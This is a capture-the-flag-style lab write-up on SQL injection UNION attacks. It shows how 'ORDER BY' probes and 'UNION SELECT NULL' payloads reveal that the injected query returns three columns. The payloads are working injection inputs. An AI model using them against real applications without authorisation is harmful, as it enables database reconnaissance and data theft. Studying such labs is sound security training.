
## Lab: SQL injection UNION attack, determining the number of columns returned by the query

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.


# Writeup

---

### **SQL Injection - UNION Attack: Determining the Number of Columns**

- `UNION` lets us combine results from two `SELECT` queries, but both queries **must** have the same number of columns.
- So, we need to figure out how many columns exist in the original query.

#### **Steps:**

1. **Try ORDER BY to estimate the number of columns:**
    
    - `' ORDER BY 1--` ✅ (Works)
    - `' ORDER BY 2--` ✅ (Works)
    - `' ORDER BY 3--` ✅ (Works)
    - `' ORDER BY 4--` ❌ (Error) → The table has **3 columns**.
2. **Confirm using UNION SELECT with NULLs:**
    
    - `' UNION SELECT NULL--` ❌ (Error)
    - `' UNION SELECT NULL, NULL--` ❌ (Error)
    - `' UNION SELECT NULL, NULL, NULL--` ✅ (Success) → **3 columns confirmed!**

🎉 **Lab solved!** 🎉